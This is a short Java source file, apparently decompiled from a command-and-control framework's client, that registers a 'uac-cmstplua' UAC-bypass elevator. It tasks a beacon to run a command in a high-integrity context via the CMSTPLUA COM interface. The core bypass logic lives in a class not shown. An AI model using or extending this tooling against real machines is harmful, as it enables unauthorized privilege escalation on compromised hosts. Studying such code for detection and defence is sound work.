package beacon.elevators;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconElevators;
import beacon.TaskBeacon;
import beacon.inline.RunAsAdminCMSTP;

public class BypassUACCMSTPLUA implements BeaconElevators.Elevator {
   protected AggressorClient client;

   public BypassUACCMSTPLUA(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconElevators(var1.getData()).register("uac-cmstplua", "Bypass UAC with CMSTPLUA COM interface", this);
   }

   public void runasadmin(String var1, String var2) {
      (new TaskBeacon(this.client, new String[0])).log_task(var1, "Tasked beacon to run " + var2 + " in a high integrity context (uac-cmstplua)", "T1088");
      (new RunAsAdminCMSTP(this.client, var2)).go(var1);
   }
}
